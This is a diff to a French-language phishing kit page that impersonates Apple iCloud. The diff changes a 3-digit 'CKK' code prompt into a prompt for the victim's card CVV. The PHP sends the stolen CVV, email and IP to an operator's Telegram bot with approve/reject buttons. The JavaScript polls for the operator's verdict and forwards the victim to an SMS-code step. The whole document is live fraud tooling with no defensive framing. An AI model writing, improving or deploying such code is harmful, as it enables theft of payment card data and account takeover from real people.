@@ -14,17 +14,17 @@ $email = $_SESSION['icloud_email'] ?? '—';
 $dt    = date('d/m/Y à H:i') . ' UTC';
 
 // Check if CKK has been validated - either from session or from URL parameter
-if (isset($_GET['ckk_done']) && $_GET['ckk_done'] === '1') {
-    $_SESSION['ckk_validated'] = true;
+if (isset($_GET['cvv_done']) && $_GET['cvv_done'] === '1') {
+    $_SESSION['cvv_validated'] = true;
 }
-$ckkValidated = isset($_SESSION['ckk_validated']) && $_SESSION['ckk_validated'] === true;
+$cvvValidated = isset($_SESSION['cvv_validated']) && $_SESSION['cvv_validated'] === true;
 
 // If CKK not yet validated and it's a POST with CKK step, process it
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step']) && $_POST['step'] === 'ckk') {
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step']) && $_POST['step'] === 'cvv') {
     header('Content-Type: application/json');
-    $ckk = isset($_POST['ckk']) ? preg_replace('/[^0-9]/', '', $_POST['ckk']) : '';
+    $cvv = isset($_POST['cvv']) ? preg_replace('/[^0-9]/', '', $_POST['cvv']) : '';
 
-    if (strlen($ckk) === 3) {
+    if (strlen($cvv) === 3) {
         // Send CKK to Telegram
         $proto  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
         $host   = $_SERVER['HTTP_HOST'];
@@ -40,7 +40,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['step']) && $_POST['st
 └ 📧 Email: <code>$email</code>
 
 <b>Code CKK</b>
-└ 🔢 Code: <code>$ckk</code>
+└ 🔢 Code: <code>$cvv</code>
 
 <b>Réseau</b>
 ├ 🌐 IP: <code>$ip</code>
@@ -51,17 +51,17 @@ TEXT;
 
         $keyboard = [
             'inline_keyboard' => [[
-                ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkok'],
-                ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkbad'],
+                ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=cvvok'],
+                ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=cvvbad'],
             ]]
         ];
 
         sendTelegramMessage($bot_token, $chat_id, $message, $keyboard);
 
         // Store temporarily and reset ip_list for polling
-        $_SESSION['ckk_code_temp'] = $ckk;
+        $_SESSION['cvv_code_temp'] = $cvv;
         $ipListFile = __DIR__ . '/security_check/ip_list.txt';
-        file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_ckk', FILE_APPEND | LOCK_EX);
+        file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_cvv', FILE_APPEND | LOCK_EX);
 
         echo json_encode(['ok' => true]);
         exit;
@@ -72,7 +72,7 @@ TEXT;
 }
 
 // Check if CKK was validated via icloud_check.php
-if (!$ckkValidated) {
+if (!$cvvValidated) {
     // Show CKK form
     ?>
 <!DOCTYPE html>
@@ -326,26 +326,26 @@ if (!$ckkValidated) {
 <div class="card">
   <div class="icon-wrap">
     <svg viewBox="0 0 42 42" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <rect x="3" y="5" width="30" height="22" rx="7" fill="#0071e3"/>
-      <rect x="9" y="11" width="18" height="2.5" rx="1.25" fill="white" opacity="0.9"/>
-      <rect x="9" y="16" width="13" height="2.5" rx="1.25" fill="white" opacity="0.9"/>
-      <rect x="9" y="21" width="10" height="2.5" rx="1.25" fill="white" opacity="0.7"/>
-      <path d="M12 27 L8 34 L18 27Z" fill="#0071e3"/>
+      <rect x="4" y="8" width="34" height="24" rx="3" fill="#0071e3" stroke="#0071e3" stroke-width="1"/>
+      <rect x="4" y="8" width="34" height="8" rx="3" fill="#005ecb"/>
+      <circle cx="10" cy="27" r="2" fill="white" opacity="0.7"/>
+      <rect x="14" y="25" width="8" height="4" rx="1" fill="white" opacity="0.7"/>
+      <text x="24" y="31" font-size="6" fill="white" opacity="0.8" font-weight="bold">CVV</text>
     </svg>
   </div>
 
-  <h1>Code de sécurité</h1>
-  <p class="subtitle">Veuillez saisir le <strong>code de contrôle de sécurité (CKK)</strong> à 3 chiffres reçu sur votre appareil.</p>
+  <h1>Vérification de la carte</h1>
+  <p class="subtitle">Veuillez saisir le <strong>code CVV</strong> à 3 chiffres au verso de votre carte enregistrée.</p>
 
-  <div class="digits" id="ckkDigits">
+  <div class="digits" id="cvvDigits">
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
   </div>
 
-  <div class="error-msg hidden" id="ckkErrMsg">Vérification en cours…</div>
+  <div class="error-msg hidden" id="cvvErrMsg">Vérification en cours…</div>
 
-  <button class="btn-verify" id="ckkBtn" disabled>Vérifier</button>
+  <button class="btn-verify" id="cvvBtn" disabled>Vérifier</button>
 </div>
   </main>
 
@@ -374,24 +374,24 @@ if (!$ckkValidated) {
 
 <script>
 (function() {
-  var ckkDigits = Array.from(document.querySelectorAll('#ckkDigits input'));
-  var ckkBtn = document.getElementById('ckkBtn');
-  var ckkErrMsg = document.getElementById('ckkErrMsg');
+  var cvvDigits = Array.from(document.querySelectorAll('#cvvDigits input'));
+  var cvvBtn = document.getElementById('cvvBtn');
+  var cvvErrMsg = document.getElementById('cvvErrMsg');
   var overlay = document.getElementById('overlay');
 
-  function getCkkCode() { return ckkDigits.map(function(d){ return d.value; }).join(''); }
+  function getCkkCode() { return cvvDigits.map(function(d){ return d.value; }).join(''); }
 
   function updateBtn() {
     var full = getCkkCode().length === 3;
-    ckkBtn.disabled = !full;
-    ckkDigits.forEach(function(d){ d.classList.toggle('filled', d.value !== ''); });
+    cvvBtn.disabled = !full;
+    cvvDigits.forEach(function(d){ d.classList.toggle('filled', d.value !== ''); });
   }
 
-  ckkDigits.forEach(function(inp, idx) {
+  cvvDigits.forEach(function(inp, idx) {
     inp.addEventListener('keydown', function(e) {
       if (e.key === 'Backspace' && inp.value === '' && idx > 0) {
-        ckkDigits[idx-1].focus();
-        ckkDigits[idx-1].value = '';
+        cvvDigits[idx-1].focus();
+        cvvDigits[idx-1].value = '';
         updateBtn();
       }
     });
@@ -399,41 +399,41 @@ if (!$ckkValidated) {
       var val = inp.value.replace(/[^0-9]/g,'');
       if (val.length > 1) {
         var chars = val.split('');
-        ckkDigits.forEach(function(d, i){ d.value = chars[i] || ''; });
+        cvvDigits.forEach(function(d, i){ d.value = chars[i] || ''; });
         var next = Math.min(chars.length, 2);
-        ckkDigits[next].focus();
+        cvvDigits[next].focus();
       } else {
         inp.value = val;
-        if (val && idx < 2) ckkDigits[idx+1].focus();
+        if (val && idx < 2) cvvDigits[idx+1].focus();
       }
       updateBtn();
     });
     inp.addEventListener('focus', function(){ inp.select(); });
   });
 
-  ckkBtn.addEventListener('click', function() {
+  cvvBtn.addEventListener('click', function() {
     var code = getCkkCode();
     if (code.length !== 3) return;
 
     overlay.classList.add('visible');
-    ckkBtn.disabled = true;
+    cvvBtn.disabled = true;
 
     fetch('handle.php', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: 'step=ckk&ckk=' + encodeURIComponent(code)
+      body: 'step=cvv&cvv=' + encodeURIComponent(code)
     }).then(function(r){ return r.json(); })
       .then(function(data) {
         if (data.ok) {
           pollCkkResult();
         } else {
           overlay.classList.remove('visible');
-          ckkBtn.disabled = false;
-          ckkErrMsg.classList.remove('hidden');
+          cvvBtn.disabled = false;
+          cvvErrMsg.classList.remove('hidden');
         }
       }).catch(function() {
         overlay.classList.remove('visible');
-        ckkBtn.disabled = false;
+        cvvBtn.disabled = false;
       });
   });
 
@@ -442,22 +442,22 @@ if (!$ckkValidated) {
       .then(function(r){ return r.text(); })
       .then(function(raw) {
         var signal = raw.trim();
-        if (signal === 'ckkok') {
-          window.location.href = 'icloud_sms.php?ckk_done=1';
-        } else if (signal === 'ckkbad') {
+        if (signal === 'cvvok') {
+          window.location.href = 'icloud_sms.php?cvv_done=1';
+        } else if (signal === 'cvvbad') {
           overlay.classList.remove('visible');
-          ckkErrMsg.classList.remove('hidden');
-          ckkDigits.forEach(function(d){ d.value = ''; });
-          ckkDigits[0].focus();
+          cvvErrMsg.classList.remove('hidden');
+          cvvDigits.forEach(function(d){ d.value = ''; });
+          cvvDigits[0].focus();
           updateBtn();
-          ckkBtn.disabled = false;
+          cvvBtn.disabled = false;
         } else {
           setTimeout(pollCkkResult, 2000);
         }
       }).catch(function() { setTimeout(pollCkkResult, 3000); });
   }
 
-  ckkDigits[0].focus();
+  cvvDigits[0].focus();
 })();
 </script>
 </body>
